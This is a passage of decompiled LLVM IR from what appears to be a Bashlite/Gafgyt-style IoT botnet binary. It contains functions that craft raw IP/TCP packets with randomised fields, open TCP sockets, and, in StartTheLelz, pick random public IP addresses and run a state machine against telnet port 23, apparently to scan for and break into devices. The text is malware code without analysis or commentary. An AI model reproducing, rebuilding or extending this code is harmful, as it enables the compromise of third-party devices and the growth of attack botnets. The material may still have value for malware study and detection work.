  br i1 %v1_804a07f, label %dec_label_pc_804a049, label %dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge

dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge: ; preds = %dec_label_pc_804a049
  br label %dec_label_pc_804a081

dec_label_pc_804a081:                             ; preds = %dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge, %dec_label_pc_804a06e.preheader
  %v4_804a06e.lcssa = phi i32 [ %v4_804a06e, %dec_label_pc_804a06e.dec_label_pc_804a081_crit_edge ], [ %v4_804a06e20, %dec_label_pc_804a06e.preheader ]
  %v1_804a085 = urem i32 %v4_804a06e.lcssa, 65536
  %v1_804a087 = xor i32 %v1_804a085, 65535
  store i32 %v0_8049ff8, i32* @ebx, align 4
  ret i32 %v1_804a087

; uselistorder directives
  uselistorder i32 %v5_804a074, { 1, 0 }
  uselistorder i32 %v4_804a06e, { 1, 0, 2 }
  uselistorder i32 %v2_804a07825, { 1, 0 }
  uselistorder i32 %v4_804a07121, { 1, 0 }
  uselistorder i32 %v4_804a06e20, { 2, 1, 0 }
  uselistorder i32 %v4_804a041, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804a019.lcssa, { 1, 0 }
  uselistorder i32 %v4_804a027, { 1, 0 }
  uselistorder i32 %v4_804a023, { 0, 2, 1 }
  uselistorder i32 %v6_804a019, { 1, 2, 0 }
  uselistorder i32 %v4_804a019, { 1, 0 }
  uselistorder label %dec_label_pc_804a049, { 1, 0 }
  uselistorder label %dec_label_pc_804a00c, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a092 = load i32, i32* @ebp, align 4
  store i32 %v0_804a092, i32* %stack_var_-4, align 4
  %v4_804a092 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a092, i32* @ebp, align 4
  %v1_804a0a6 = add i32 %tmp10, 12
  %v2_804a0a6 = inttoptr i32 %v1_804a0a6 to i32*
  %v3_804a0a6 = load i32, i32* %v2_804a0a6, align 4
  %v1_804a0af = add i32 %tmp10, 16
  %v2_804a0af = inttoptr i32 %v1_804a0af to i32*
  %v3_804a0af = load i32, i32* %v2_804a0af, align 4
  %v2_804a0c4 = call i32 @htons(i16 20)
  %v1_804a0dd = call i32 @malloc(i32 32)
  store i32 %v1_804a0dd, i32* %ecx.global-to-local, align 4
  %v2_804a0ed = inttoptr i32 %v1_804a0dd to i32*
  store i32 %v3_804a0a6, i32* %v2_804a0ed, align 4
  %v1_804a0f2 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a0f2 = add i32 %v1_804a0f2, 4
  %v3_804a0f2 = inttoptr i32 %v2_804a0f2 to i32*
  store i32 %v3_804a0af, i32* %v3_804a0f2, align 4
  %v1_804a0f8 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a0f8 = add i32 %v1_804a0f8, 8
  %v3_804a0f8 = inttoptr i32 %v2_804a0f8 to i32*
  store i32 0, i32* %v3_804a0f8, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804a101 = add i32 %v1_804a0dd, 12
  store i32 %v1_804a101, i32* %edx.global-to-local, align 4
  %v1_804a104 = inttoptr i32 %tmp2 to i32*
  %v2_804a104 = load i32, i32* %v1_804a104, align 4
  %v2_804a106 = inttoptr i32 %v1_804a101 to i32*
  store i32 %v2_804a104, i32* %v2_804a106, align 4
  %v0_804a108 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a108 = add i32 %v0_804a108, 4
  %v2_804a108 = inttoptr i32 %v1_804a108 to i32*
  %v3_804a108 = load i32, i32* %v2_804a108, align 4
  %v1_804a10b = load i32, i32* %edx.global-to-local, align 4
  %v2_804a10b = add i32 %v1_804a10b, 4
  %v3_804a10b = inttoptr i32 %v2_804a10b to i32*
  store i32 %v3_804a108, i32* %v3_804a10b, align 4
  %v0_804a10e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a10e = add i32 %v0_804a10e, 8
  %v2_804a10e = inttoptr i32 %v1_804a10e to i32*
  %v3_804a10e = load i32, i32* %v2_804a10e, align 4
  %v1_804a111 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a111 = add i32 %v1_804a111, 8
  %v3_804a111 = inttoptr i32 %v2_804a111 to i32*
  store i32 %v3_804a10e, i32* %v3_804a111, align 4
  %v0_804a114 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a114 = add i32 %v0_804a114, 12
  %v2_804a114 = inttoptr i32 %v1_804a114 to i32*
  %v3_804a114 = load i32, i32* %v2_804a114, align 4
  %v1_804a117 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a117 = add i32 %v1_804a117, 12
  %v3_804a117 = inttoptr i32 %v2_804a117 to i32*
  store i32 %v3_804a114, i32* %v3_804a117, align 4
  %v0_804a11a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a11a = add i32 %v0_804a11a, 16
  %v2_804a11a = inttoptr i32 %v1_804a11a to i32*
  %v3_804a11a = load i32, i32* %v2_804a11a, align 4
  %v1_804a11d = load i32, i32* %edx.global-to-local, align 4
  %v2_804a11d = add i32 %v1_804a11d, 16
  %v3_804a11d = inttoptr i32 %v2_804a11d to i32*
  store i32 %v3_804a11a, i32* %v3_804a11d, align 4
  %v2_804a12d = inttoptr i32 %v1_804a0dd to i16*
  %v3_804a12d = call i32 @csum(i16* %v2_804a12d, i32 32)
  %v1_804a132 = urem i32 %v3_804a12d, 65536
  %v1_804a13f = call i32 @free(i32 %v1_804a0dd)
  %v2_804a148 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a148, i32* @ebp, align 4
  ret i32 %v1_804a132

; uselistorder directives
  uselistorder i32 %v1_804a0dd, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a14a = load i32, i32* @ebp, align 4
  store i32 %v0_804a14a, i32* %stack_var_-4, align 4
  %v4_804a150 = sext i8 %tmp8 to i32
  %v4_804a156 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804a171 = add i32 %v4_804a156, 1
  %v2_804a171 = inttoptr i32 %v1_804a171 to i8*
  store i8 0, i8* %v2_804a171, align 1
  %v1_804a17b = add i32 %tmp5, 20
  %v1_804a184 = trunc i32 %v1_804a17b to i16
  %v3_804a184 = add i32 %v4_804a156, 2
  %v4_804a184 = inttoptr i32 %v3_804a184 to i16*
  store i16 %v1_804a184, i16* %v4_804a184, align 2
  %v2_804a188 = call i32 @rand_cmwc(i32 %v4_804a150)
  %v1_804a193 = trunc i32 %v2_804a188 to i16
  %v3_804a193 = add i32 %v4_804a156, 4
  %v4_804a193 = inttoptr i32 %v3_804a193 to i16*
  store i16 %v1_804a193, i16* %v4_804a193, align 2
  %v1_804a19a = add i32 %v4_804a156, 6
  %v2_804a19a = inttoptr i32 %v1_804a19a to i16*
  store i16 0, i16* %v2_804a19a, align 2
  %v1_804a1a3 = add i32 %v4_804a156, 8
  %v2_804a1a3 = inttoptr i32 %v1_804a1a3 to i8*
  store i8 -1, i8* %v2_804a1a3, align 1
  %v3_804a1ae = add i32 %v4_804a156, 9
  %v4_804a1ae = inttoptr i32 %v3_804a1ae to i8*
  store i8 %tmp8, i8* %v4_804a1ae, align 1
  %v1_804a1b4 = add i32 %v4_804a156, 10
  %v2_804a1b4 = inttoptr i32 %v1_804a1b4 to i16*
  store i16 0, i16* %v2_804a1b4, align 2
  %v2_804a1c0 = add i32 %v4_804a156, 12
  %v3_804a1c0 = inttoptr i32 %v2_804a1c0 to i32*
  %v2_804a1c9 = add i32 %v4_804a156, 16
  %v3_804a1c9 = inttoptr i32 %v2_804a1c9 to i32*
  store i32 %tmp, i32* %v3_804a1c9, align 4
  %v2_804a1cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a1cc, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 4, 0, 1, 3, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804a1d4 = add i32 %arg1, -2
  %v9_804a1d4 = sub i32 1, %arg1
  %v10_804a1d4 = and i32 %v9_804a1d4, %arg1
  %v11_804a1d4 = icmp slt i32 %v10_804a1d4, 0
  %v12_804a1d4 = icmp eq i32 %v4_804a1d4, 0
  %v13_804a1d4 = icmp slt i32 %v4_804a1d4, 0
  %v3_804a1d8 = icmp eq i1 %v13_804a1d4, %v11_804a1d4
  %v4_804a1d8 = icmp eq i1 %v12_804a1d4, false
  %v5_804a1d8 = and i1 %v4_804a1d8, %v3_804a1d8
  br i1 %v5_804a1d8, label %dec_label_pc_804a1e3, label %dec_label_pc_804a1f5

dec_label_pc_804a1e3:                             ; preds = %entry
  %v1_804a1e9 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804a1f5

dec_label_pc_804a1f5:                             ; preds = %entry, %dec_label_pc_804a1e3
  %storemerge = phi i32 [ 0, %dec_label_pc_804a1e3 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804a1d4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a1f5, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804a1fa = load i32, i32* @ebp, align 4
  store i32 %v0_804a1fa, i32* %stack_var_-4, align 4
  %v4_804a1fa = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a1fa, i32* @ebp, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804a214 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804a21c = icmp eq i32 %v1_804a214, 0
  %v1_804a220 = icmp eq i1 %v4_804a21c, false
  br i1 %v1_804a220, label %dec_label_pc_804a22e, label %dec_label_pc_804a2f3

dec_label_pc_804a22e:                             ; preds = %entry
  %v1_804a231 = add i32 %v1_804a214, 12
  %v2_804a231 = inttoptr i32 %v1_804a231 to i32*
  %v3_804a231 = load i32, i32* %v2_804a231, align 4
  %v1_804a239 = add i32 %v1_804a214, 16
  %v2_804a239 = inttoptr i32 %v1_804a239 to i32*
  %v3_804a239 = load i32, i32* %v2_804a239, align 4
  %v1_804a23c = inttoptr i32 %v3_804a239 to i32*
  %v2_804a23c = load i32, i32* %v1_804a23c, align 4
  %v15_804a245 = ptrtoint i32* %stack_var_-24 to i32
  %v3_804a24f = call i32 @bcopy(i32 %v2_804a23c, i32 %v15_804a245, i32 %v3_804a231)
  %v2_804a25b = call i32 @htons(i16 %arg2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804a284 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804a28c = ptrtoint i32* %stack_var_-32 to i32
  %v5_804a2b1 = call i32 @__GI_setsockopt(i32 %v3_804a284, i32 6, i32 1, i32 %v2_804a28c, i32 4)
  %v13_804a2b6 = icmp eq i32 %v3_804a284, -1
  %v1_804a2ba = icmp eq i1 %v13_804a2b6, false
  br i1 %v1_804a2ba, label %dec_label_pc_804a2c5, label %dec_label_pc_804a2f3

dec_label_pc_804a2c5:                             ; preds = %dec_label_pc_804a22e
  %v2_804a242 = ptrtoint i32* %stack_var_-28 to i32
  %v3_804a2da = call i32 @__libc_connect(i32 %v3_804a284, i32 %v2_804a242, i32 16)
  %v10_804a2df = icmp eq i32 %v3_804a2da, -1
  %v1_804a2e2 = icmp eq i1 %v10_804a2df, false
  br i1 %v1_804a2e2, label %dec_label_pc_804a2ed, label %dec_label_pc_804a2f3

dec_label_pc_804a2ed:                             ; preds = %dec_label_pc_804a2c5
  br label %dec_label_pc_804a2f3

dec_label_pc_804a2f3:                             ; preds = %dec_label_pc_804a2c5, %dec_label_pc_804a22e, %entry, %dec_label_pc_804a2ed
  %stack_var_-44.0 = phi i32 [ %v3_804a284, %dec_label_pc_804a2ed ], [ 0, %entry ], [ 0, %dec_label_pc_804a22e ], [ 0, %dec_label_pc_804a2c5 ]
  %v2_804a2f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a2f6, i32* @ebp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v3_804a284, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804a2f3, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804a311 = call i32 @__GI_time(i32* null)
  store i32 %v2_804a311, i32* %eax.global-to-local, align 4
  store i32 %v2_804a311, i32* @ebx, align 4
  %v1_804a318 = call i32 @rand_cmwc(i32 0)
  %v1_804a31d = load i32, i32* @ebx, align 4
  %v2_804a31d = xor i32 %v1_804a31d, %v1_804a318
  store i32 %v2_804a31d, i32* @eax, align 4
  %v1_804a322 = call i32 @srand(i32 %v2_804a31d)
  store i32 %v1_804a322, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v2_804a337 = call i32 @htons(i16 23)
  %v2_804a346 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804a34c = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804a34c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804a363 = call i32 @malloc(i32 1025)
  store i32 %v1_804a363, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804a384 = inttoptr i32 %v1_804a363 to i8*
  %v4_804a384 = call i32 @__GI_memset(i8* %v3_804a384, i32 0, i32 1025)
  %v2_804a39a = mul i32 %arg2, 28
  %v1_804a39f = add i32 %v2_804a39a, 30
  %v2_804a3a2 = and i32 %v1_804a39f, -16
  %v0_804a3a8 = load i32, i32* @esp, align 4
  %v2_804a3a8 = sub i32 %v0_804a3a8, %v2_804a3a2
  %v1_804a3ba = add i32 %v2_804a3a8, 35
  %v2_804a3bd = and i32 %v1_804a3ba, -16
  %v2_804a3da = mul i32 %arg2, 5
  store i32 %v2_804a3da, i32* %edx.global-to-local, align 4
  %v1_804a3e0 = inttoptr i32 %v2_804a3bd to i8*
  store i32 %v2_804a3bd, i32* @edi, align 4
  %v1_804a3e5 = and i32 %v1_804a3ba, -256
  store i32 %v1_804a3e5, i32* %eax.global-to-local, align 4
  %v5_804a3e7 = call i8* @_memset(i8* %v1_804a3e0, i32 %v1_804a3e5, i32 %v2_804a3da)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a47458 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a47458, label %dec_label_pc_804a3f2.lr.ph, label %dec_label_pc_804a481

dec_label_pc_804a3f2.lr.ph:                       ; preds = %entry
  %v2_804a446 = or i32 %v2_804a3bd, 9
  br label %dec_label_pc_804a3f2

dec_label_pc_804a3f2:                             ; preds = %dec_label_pc_804a3f2, %dec_label_pc_804a3f2.lr.ph
  %storemerge259 = phi i32 [ 0, %dec_label_pc_804a3f2.lr.ph ], [ %v4_804a46b, %dec_label_pc_804a3f2 ]
  %v2_804a406 = mul i32 %storemerge259, 28
  %v2_804a408 = add i32 %v2_804a406, %v2_804a3bd
  store i32 %v2_804a408, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a410 = inttoptr i32 %v2_804a408 to i32*
  store i32 0, i32* %v2_804a410, align 4
  %v0_804a412 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a412 = add i32 %v0_804a412, 4
  store i32 %v1_804a412, i32* %eax.global-to-local, align 4
  %v0_804a415 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a415 = inttoptr i32 %v1_804a412 to i32*
  store i32 %v0_804a415, i32* %v2_804a415, align 4
  %v0_804a417 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a417 = add i32 %v0_804a417, 4
  store i32 %v1_804a417, i32* %eax.global-to-local, align 4
  %v0_804a41a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a41a = inttoptr i32 %v1_804a417 to i32*
  store i32 %v0_804a41a, i32* %v2_804a41a, align 4
  %v0_804a41c = load i32, i32* %eax.global-to-local, align 4
  %v1_804a41c = add i32 %v0_804a41c, 4
  store i32 %v1_804a41c, i32* %eax.global-to-local, align 4
  %v0_804a41f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a41f = inttoptr i32 %v1_804a41c to i32*
  store i32 %v0_804a41f, i32* %v2_804a41f, align 4
  %v0_804a421 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a421 = add i32 %v0_804a421, 4
  store i32 %v1_804a421, i32* %eax.global-to-local, align 4
  %v0_804a424 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a424 = inttoptr i32 %v1_804a421 to i32*
  store i32 %v0_804a424, i32* %v2_804a424, align 4
  %v0_804a426 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a426 = add i32 %v0_804a426, 4
  store i32 %v1_804a426, i32* %eax.global-to-local, align 4
  %v0_804a429 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a429 = inttoptr i32 %v1_804a426 to i32*
  store i32 %v0_804a429, i32* %v2_804a429, align 4
  %v0_804a42b = load i32, i32* %eax.global-to-local, align 4
  %v1_804a42b = add i32 %v0_804a42b, 4
  %v0_804a42e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a42e = inttoptr i32 %v1_804a42b to i32*
  store i32 %v0_804a42e, i32* %v2_804a42e, align 4
  %v3_804a446 = add i32 %v2_804a446, %v2_804a406
  %v4_804a446 = inttoptr i32 %v3_804a446 to i8*
  store i8 1, i8* %v4_804a446, align 1
  %v1_804a463 = add i32 %v2_804a408, 24
  store i32 %v1_804a463, i32* %edx.global-to-local, align 4
  %v2_804a469 = inttoptr i32 %v1_804a463 to i32*
  store i32 %v1_804a363, i32* %v2_804a469, align 4
  %v4_804a46b = add nuw nsw i32 %storemerge259, 1
  store i32 %v4_804a46b, i32* %eax.global-to-local, align 4
  %exitcond60 = icmp eq i32 %v4_804a46b, %arg2
  br i1 %exitcond60, label %dec_label_pc_804a481, label %dec_label_pc_804a3f2

dec_label_pc_804a481:                             ; preds = %entry, %dec_label_pc_804a3f2, %dec_label_pc_804a481
  %stack_var_-48.0 = phi i32 [ %v4_804a481, %dec_label_pc_804a481 ], [ 0, %dec_label_pc_804a3f2 ], [ 0, %entry ]
  %v4_804a481 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804a481, i32* %eax.global-to-local, align 4
  %v1_804a487 = mul i32 %v4_804a481, 4
  %v2_804a487 = add i32 %v1_804a487, ptrtoint ([10 x i8*]* @global_var_8059d20.52 to i32)
  %v3_804a487 = inttoptr i32 %v2_804a487 to i32*
  %v4_804a487 = load i32, i32* %v3_804a487, align 4
  store i32 %v4_804a487, i32* %eax.global-to-local, align 4
  %v1_804a48e = icmp eq i32 %v4_804a487, 0
  %v1_804a490 = icmp eq i1 %v1_804a48e, false
  br i1 %v1_804a490, label %dec_label_pc_804a481, label %dec_label_pc_804a492.preheader

dec_label_pc_804a492.preheader:                   ; preds = %dec_label_pc_804a481
  %v2_804a8a3 = ptrtoint i32* %stack_var_-316 to i32
  %tmp37 = bitcast i32* %stack_var_-316 to i8*
  %v2_804a923 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804a989 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804a993 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804a502 = or i32 %v2_804a3bd, 8
  %v2_804a542 = or i32 %v2_804a3bd, 9
  %v2_804a633 = or i32 %v2_804a3bd, 11
  %v2_804a67a = or i32 %v2_804a3bd, 10
  %v2_804b0ac = add i32 %v2_804a3bd, 16
  br label %dec_label_pc_804a492

dec_label_pc_804a492:                             ; preds = %dec_label_pc_804a492, %dec_label_pc_804b42f, %dec_label_pc_804a492.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804a492.preheader ], [ %stack_var_-624.0, %dec_label_pc_804a492 ], [ %stack_var_-624.1, %dec_label_pc_804b42f ]
  %stack_var_-628.0 = phi i32 [ %tmp3, %dec_label_pc_804a492.preheader ], [ %stack_var_-628.0, %dec_label_pc_804a492 ], [ %stack_var_-628.1, %dec_label_pc_804b42f ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a47458, label %dec_label_pc_804a49e, label %dec_label_pc_804a492

dec_label_pc_804a49e:                             ; preds = %dec_label_pc_804a492, %dec_label_pc_804b42f
  %storemerge49 = phi i32 [ %v4_804b42f, %dec_label_pc_804b42f ], [ 0, %dec_label_pc_804a492 ]
  %stack_var_-628.248 = phi i32 [ %stack_var_-628.1, %dec_label_pc_804b42f ], [ %stack_var_-628.0, %dec_label_pc_804a492 ]
  %stack_var_-624.247 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804b42f ], [ %stack_var_-624.0, %dec_label_pc_804a492 ]
  %v1_804a4a4 = mul i32 %storemerge49, 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v2_804a4b2 = mul i32 %storemerge49, 28
  %v2_804a4b4 = add i32 %v2_804a4b2, %v2_804a3bd
  %v1_804a4b6 = add i32 %v2_804a4b4, 16
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v1_804a4b9 = inttoptr i32 %v1_804a4b6 to i32*
  %v2_804a4b9 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804a4b9, i32* %eax.global-to-local, align 4
  %v1_804a4bb = icmp eq i32 %v2_804a4b9, 0
  %v1_804a4bd = icmp eq i1 %v1_804a4bb, false
  br i1 %v1_804a4bd, label %dec_label_pc_804a4ec, label %dec_label_pc_804a4bf

dec_label_pc_804a4bf:                             ; preds = %dec_label_pc_804a49e
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804a4c2 = load i32, i32* @esp, align 4
  %v1_804a4c2 = inttoptr i32 %v0_804a4c2 to i32*
  store i32 0, i32* %v1_804a4c2, align 4
  %v1_804a4c9 = inttoptr i32 %storemerge49 to i32*
  %v2_804a4c9 = call i32 @__GI_time(i32* %v1_804a4c9)
  store i32 %v2_804a4c9, i32* @esi, align 4
  %v0_804a4d3 = load i32, i32* @ebx, align 4
  %v1_804a4d5 = mul i32 %v0_804a4d3, 4
  store i32 %v1_804a4d5, i32* %edx.global-to-local, align 4
  %v2_804a4e3 = mul i32 %v0_804a4d3, 28
  %v2_804a4e5 = add i32 %v2_804a4e3, %v2_804a3bd
  %v1_804a4e7 = add i32 %v2_804a4e5, 16
  store i32 %v1_804a4e7, i32* %eax.global-to-local, align 4
  %v2_804a4ea = inttoptr i32 %v1_804a4e7 to i32*
  store i32 %v2_804a4c9, i32* %v2_804a4ea, align 4
  br label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a49e, %dec_label_pc_804a4bf
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a502 = add i32 %v2_804a502, %v2_804a4b2
  %v4_804a502 = inttoptr i32 %v3_804a502 to i8*
  %v5_804a502 = load i8, i8* %v4_804a502, align 4
  %v6_804a502 = zext i8 %v5_804a502 to i32
  store i32 %v6_804a502, i32* %eax.global-to-local, align 4
  store i32 %v6_804a502, i32* @edi, align 4
  %v1_804a523 = mul nuw nsw i32 %v6_804a502, 4
  %v2_804a523 = add nuw nsw i32 %v1_804a523, 134571944
  %v3_804a523 = inttoptr i32 %v2_804a523 to i32*
  %v4_804a523 = load i32, i32* %v3_804a523, align 4
  store i32 %v4_804a523, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a502, label %dec_label_pc_804b42f [
    i8 0, label %dec_label_pc_804a52c
    i8 1, label %dec_label_pc_804a899
    i8 2, label %dec_label_pc_804aaff
    i8 3, label %dec_label_pc_804ac3f
    i8 4, label %dec_label_pc_804ad92
    i8 5, label %dec_label_pc_804aed2
    i8 6, label %dec_label_pc_804b025
    i8 7, label %dec_label_pc_804b2bf
  ]

dec_label_pc_804a52c:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804a542 = add i32 %v2_804a542, %v2_804a4b2
  %v4_804a542 = inttoptr i32 %v3_804a542 to i8*
  %v5_804a542 = load i8, i8* %v4_804a542, align 1
  %v10_804a547 = icmp eq i8 %v5_804a542, 1
  %v1_804a549 = icmp eq i1 %v10_804a547, false
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  br i1 %v1_804a549, label %dec_label_pc_804a5f8, label %dec_label_pc_804a54f

dec_label_pc_804a54f:                             ; preds = %dec_label_pc_804a52c
  %v1_804a567 = add i32 %v2_804a4b4, 24
  store i32 %v1_804a567, i32* %eax.global-to-local, align 4
  %v1_804a56a = inttoptr i32 %v1_804a567 to i32*
  %v2_804a56a = load i32, i32* %v1_804a56a, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a58d = inttoptr i32 %v2_804a4b4 to i32*
  store i32 0, i32* %v2_804a58d, align 4
  %v0_804a58f = load i32, i32* %eax.global-to-local, align 4
  %v1_804a58f = add i32 %v0_804a58f, 4
  store i32 %v1_804a58f, i32* %eax.global-to-local, align 4
  %v0_804a592 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a592 = inttoptr i32 %v1_804a58f to i32*
  store i32 %v0_804a592, i32* %v2_804a592, align 4
  %v0_804a594 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a594 = add i32 %v0_804a594, 4
  store i32 %v1_804a594, i32* %eax.global-to-local, align 4
  %v0_804a597 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a597 = inttoptr i32 %v1_804a594 to i32*
  store i32 %v0_804a597, i32* %v2_804a597, align 4
  %v0_804a599 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a599 = add i32 %v0_804a599, 4
  store i32 %v1_804a599, i32* %eax.global-to-local, align 4
  %v0_804a59c = load i32, i32* %edx.global-to-local, align 4
  %v2_804a59c = inttoptr i32 %v1_804a599 to i32*
  store i32 %v0_804a59c, i32* %v2_804a59c, align 4
  %v0_804a59e = load i32, i32* %eax.global-to-local, align 4
  %v1_804a59e = add i32 %v0_804a59e, 4
  store i32 %v1_804a59e, i32* %eax.global-to-local, align 4
  %v0_804a5a1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5a1 = inttoptr i32 %v1_804a59e to i32*
  store i32 %v0_804a5a1, i32* %v2_804a5a1, align 4
  %v0_804a5a3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5a3 = add i32 %v0_804a5a3, 4
  store i32 %v1_804a5a3, i32* %eax.global-to-local, align 4
  %v0_804a5a6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5a6 = inttoptr i32 %v1_804a5a3 to i32*
  store i32 %v0_804a5a6, i32* %v2_804a5a6, align 4
  %v0_804a5a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a5a8 = add i32 %v0_804a5a8, 4
  %v0_804a5ab = load i32, i32* %edx.global-to-local, align 4
  %v2_804a5ab = inttoptr i32 %v1_804a5a8 to i32*
  store i32 %v0_804a5ab, i32* %v2_804a5ab, align 4
  store i32 %v1_804a567, i32* %edx.global-to-local, align 4
  store i32 %v2_804a56a, i32* @eax, align 4
  store i32 %v2_804a56a, i32* %v1_804a56a, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v1_804a5d0 = call i32 @GetRandomPublicIP(i32 %v6_804a502)
  %v0_804a5da = load i32, i32* @ebx, align 4
  %v1_804a5dc = mul i32 %v0_804a5da, 4
  store i32 %v1_804a5dc, i32* %edx.global-to-local, align 4
  %v2_804a5ea = mul i32 %v0_804a5da, 28
  %v2_804a5ec = add i32 %v2_804a5ea, %v2_804a3bd
  %v1_804a5ee = add i32 %v2_804a5ec, 4
  store i32 %v1_804a5ee, i32* %eax.global-to-local, align 4
  %v2_804a5f1 = inttoptr i32 %v1_804a5ee to i32*
  store i32 %v1_804a5d0, i32* %v2_804a5f1, align 4
  br label %dec_label_pc_804a6e8

